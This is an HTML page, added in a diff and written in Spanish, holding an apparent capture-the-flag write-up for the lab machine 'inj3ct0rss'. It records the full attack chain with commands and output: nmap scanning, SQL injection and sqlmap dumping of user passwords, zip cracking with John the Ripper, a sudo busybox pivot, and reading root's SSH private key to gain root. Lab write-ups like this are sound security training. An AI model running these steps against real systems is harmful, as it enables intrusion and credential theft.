@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Walking Dead</title>
+    <link href="../style/estilo.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1>Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+            <a href="../writeups.html" class="hover:text-blue-400 transition">Write-ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <main class="max-w-4xl mx-auto px-6 py-12">
+
+    <h1 class="text-4xl font-bold mb-2">🔹Maquina: inj3ct0rss</h1>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el 26/08/2025 | Categoría: LINUX </p>
+
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            Este reto consiste en comprometer una máquina Linux en un entorno controlado. No se proporciona una flag directa,
+            pero el objetivo es obtener acceso privilegiado (root) y entender el vector de escalada.
+        </p>
+    </section>
+
+    <!----------------- Análisis ----------------------->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔍 Análisis inicial</h2>
+        <p class="text-gray-300 mb-4">
+            El análisis comenzó con un reconocimiento básico utilizando herramientas de enumeración para comprender los servicios expuestos.
+        </p>
+        <pre><code class="language-bash">
+            sudo nmap -p- -open -O -sS -sCV -min-rate 5000 -n -Pn -vvv 172.17.0.2
+            
+            PORT   STATE SERVICE REASON         VERSION
+            22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
+            | ssh-hostkey: 
+            |   256 fd:f8:90:30:73:b2:51:20:2d:cb:7a:77:67:69:dc:e5 (ECDSA)
+            | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBExyKJmqP02QSpyCbDMVK8cvWcsJmAHf2WEyjBSElOMDSrdK7mawGufQtAKuf6aCZGWjM8HtOa++iu47gY/224g=
+            |   256 ad:54:3f:1a:45:7c:b5:97:fb:5b:a8:fb:63:1d:1d:0b (ED25519)
+            |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAxCKvhvk5MXJSo9kabqvQHsuRDOnSE0M+Z6El2r9+4X
+            80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+            |_http-server-header: Apache/2.4.58 (Ubuntu)
+            |_http-title: Inj3ct0rs CTF - P\xC3\xA1gina Principal
+            | http-methods: 
+            |_  Supported Methods: GET HEAD POST OPTIONS
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            entramos a Inj3ct0rs CTF, en la cual nos deja iniciar sesion o registrarnos
+        </p>
+
+        <img src="../Assets/Inj3ct0rss/1-index.png" class="mb-4" alt="inicio">
+
+        <img src="../Assets/Inj3ct0rss/2-inicio-sesion.png" class="mb-4" alt="inicio">
+
+        <p class="text-gray-300 mb-4">
+            Probamos realizar un sqlinjeccion, el cual fue exitoso y usamos sqlmap para tener mas informacion
+        </p>
+        <img src="../Assets/Inj3ct0rss/3-sql-injeccion.png" class="mb-4" alt="inicio">
+
+        <pre><code class="language-bash">
+            sqlmap -r post.txt --batch --random-agent --dbs
+
+            available databases [5]:
+            [*] information_schema
+            [*] injectors_db
+            [*] mysql
+            [*] performance_schema
+            [*] sys
+
+            sqlmap -r post.txt -D injectors_db --tables --batch
+
+            [1 table]
+            +-------+
+            | users |
+            +-------+
+
+            sqlmap -r post.txt -D injectors_db -T users --columns --batch
+
+            Database: injectors_db
+            Table: users
+            [3 columns]
+            +----------+-------------+
+            | Column   | Type        |
+            +----------+-------------+
+            | id       | int         |
+            | password | varchar(50) |
+            | username | varchar(50) |
+            +----------+-------------+
+
+            sqlmap -r post.txt -D injectors_db -T users -C "username,password" --dump --batch
+
+            Database: injectors_db
+            Table: users
+            [4 entries]
+            +----------+-----------------------------+
+            | username | password                    |
+            +----------+-----------------------------+
+            | jane     | chicago123                  |
+            | root     | loveyou                     |
+            | ralf     | no_mirar_en_este_directorio |
+            | admin    | password                    |
+            +----------+-----------------------------+
+
+        </code></pre>
+        
+        <p class="text-gray-300 mb-4">
+            Entramos al directorio no_mirar_en_este_directorio:
+        </p>
+
+        <img src="../Assets/Inj3ct0rss/4-directorio-oculto.png" class="mb-4" alt="inicio">
+
+        <p class="text-gray-300 mb-4">
+            Descargamos el secret.zip, el cual tenia contraseña entonces hacemos fuerza bruta con Jonh the Ripper:
+        </p>
+
+        <pre><code class="language-bash">
+            zip2john secret.zip > secret.hash
+
+            ver 2.0 efh 5455 efh 7875 secret.zip/confidencial.txt PKZIP Encr: TS_chk, cmplen=132, decmplen=177, crc=D2FD3E9E ts=7A38 cs=7a38 type=8
+            ❯ john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash
+
+            Using default input encoding: UTF-8
+            Loaded 1 password hash (PKZIP [32/64])
+            Will run 2 OpenMP threads
+            Press 'q' or Ctrl-C to abort, almost any other key for status
+            computer         (secret.zip/confidencial.txt)     
+            1g 0:00:00:00 DONE (2025-08-26 16:31) 10.00g/s 40960p/s 40960c/s 40960C/s 123456..oooooo
+            Use the "--show" option to display all of the cracked passwords reliably
+            Session completed. 
+            ❯ john --show secret.hash
+
+            secret.zip/confidencial.txt:computer:confidencial.txt:secret.zip::secret.zip
+
+            1 password hash cracked, 0 left
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Ya tenemos la contraseña que era computer, el contenido es:
+        </p>
+
+        <img src="../Assets/Inj3ct0rss/5-confidencial-txt.png" class="mb-4" alt="inicio">
+
+        <p class="text-gray-300 mb-4">
+            Entramos por ssh con el usuario ralf y la contraseña supersecurepassword
+        </p>
+
+        <pre><code class="language-bash">
+            sudo -l
+
+            User ralf may run the following commands on 4010acc64394:
+            (capa : capa) NOPASSWD: /usr/local/bin/busybox /nothing/*
+
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Esto significaba que ralf podía ejecutar busybox como el usuario capa, pero únicamente sobre archivos dentro de /nothing/*.
+            Se creó el directorio /nothing y se intentó enlazar /bin/sh para explotarlo, pero inicialmente dio error. 
+            Sin embargo, usando directamente sudo:
+        </p>
+
+        <pre><code class="language-bash">
+            sudo -u capa /usr/local/bin/busybox /nothing/sh
+
+            whoami
+            capa        
+        </code></pre>
+    <!-- Explotación / Resolución -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">💣 Escalada de privilegios / Resolución</h2>
+
+        <pre><code class="language-bash">
+            sudo -l
+
+            User capa may run the following commands on 4010acc64394:
+            (ALL : ALL) NOPASSWD: /bin/cat
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Esto significa que capa podía ejecutar cat como root sin contraseña.
+            Se intentó inicialmente leer /root/root.txt:
+        </p>
+
+        <pre><code class="language-bash">
+            sudo cat /root/root.txt
+
+            It's not worth looking at this file alone, you have to be root hehe
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Al listar el directorio /root, se encontró un archivo sospechoso con una clave privada SSH:
+        </p>
+
+        <pre><code class="language-bash">
+            sudo cat /root/.ssh/id_rsa
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            La clave se copió a la máquina atacante como id_rsa_root, se ajustaron permisos 
+            y se utilizó para conectarse como root:
+        </p>
+
+        <pre><code class="language-bash">
+            ssh -i id_rsa_root root@172.17.0.2
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Listo:
+        </p>
+
+        <pre><code class="language-bash">
+            whoami
+                root
+        </code></pre>
+    </section>
+
+    <!-- Resultado final -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🏆 Resultado</h2>
+        <p class="text-gray-300">
+            Conseguimos acceso como <code>root</code>.
+        </p>
+    </section>
+
+    <div class="mt-10">
+        <a href="../writeup.html"
+            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write-ups
+        </a>
+    </div>
+
+    </main>
+
+</body>
+</html>
